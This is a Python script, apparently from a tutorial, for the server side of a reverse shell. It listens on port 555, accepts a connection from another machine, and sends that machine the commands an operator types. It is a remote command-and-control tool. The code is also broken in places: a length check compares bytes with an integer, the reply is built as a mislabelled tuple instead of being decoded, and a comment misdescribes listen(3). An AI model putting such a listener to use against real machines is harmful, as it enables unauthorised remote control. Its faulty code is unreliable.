import socket
import sys

# Creating a socket (Connecting 2 PC)

def create_socket():
    try:
        global host
        global port
        global s

        host = ""
        port = 555

        # Socket create
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation Error !! " + str(msg))

def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the port: " + str(port))
        s.bind((host, port))

        # If exception Re-trying 3 time
        s.listen(3)

    except socket.error as msg:
        print("Socket binding Error!! " + str(msg) + "\n" + "Retring...")
        bind_socket()

# Accept the connection
def socket_accept():
    conn, address = s.accept() # Command accept using s.accept

    print("Connection has been established !!" + "IP: |" + address[0] + "Port: " + str(address[1])) # Port int so convert to string
    send_commands(conn)
    conn.close()

def send_commands(conn):
    while True: # Take multiple command
        cmd = input()

        if cmd == "quit": # Write "quit" then Exit
            conn.close()
            s.close()
            sys.exit()
        if len (str.encode(cmd) > 0):
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024)), "utf=8" # Encoding utf=8

            print(client_response, end="") # Command execute then new line

def main():
    create_socket()
    bind_socket()
    socket_accept()

# Main function
main()